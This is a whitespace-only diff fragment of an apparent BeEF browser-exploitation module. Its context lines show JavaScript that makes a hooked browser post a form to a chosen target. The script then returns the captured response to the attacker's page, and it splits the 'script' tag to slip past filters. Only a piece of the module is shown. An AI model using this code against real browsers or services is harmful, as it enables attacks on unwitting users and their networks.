@@ -31,7 +31,7 @@ beef.execute(function() {
 		myform.setAttribute("method","post");
 		myform.setAttribute("enctype","multipart/form-data");
 		myform.setAttribute("action",action);
-		document.getElementById("ipc_posix_window_<%= @command_id %>").contentWindow.document.body.appendChild(myform); 
+		document.getElementById("ipc_posix_window_<%= @command_id %>").contentWindow.document.body.appendChild(myform);
 
 		body1="<html><body><div id='ipc_content'>";
         body2="__END_OF_POSIX_IPC<%= @command_id %>__</div><s"+"cript>window.location='"+parent+"#ipc_result='+encodeURI(document.getElementById(\\\"ipc_content\\\").innerHTML);</"+"script></body></html>";
@@ -93,4 +93,3 @@ beef.execute(function() {
 	}
 
 });
-
